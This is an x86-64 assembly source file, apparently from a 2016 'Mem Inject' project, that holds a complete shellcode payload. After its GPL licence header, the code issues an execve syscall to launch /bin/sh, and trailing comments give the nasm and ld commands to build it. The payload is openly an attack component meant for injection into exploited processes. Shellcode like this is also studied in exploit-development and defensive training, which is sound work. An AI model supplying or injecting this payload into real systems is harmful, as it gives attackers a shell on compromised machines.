/*
  Mem Inject (x86 64bits shellcode)
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

section .text
	global _start   
 
_start:
	xor rax,rax
	mov rdx,rax 		; No Env
	mov rsi,rax		; No argv
	lea rdi, [rel msg]

	add al, 0x3b

	syscall
	msg db '/bin/sh',0 
	
; nasm -f elf -o s64.o s64.asm
; ld -o s64 s64.o
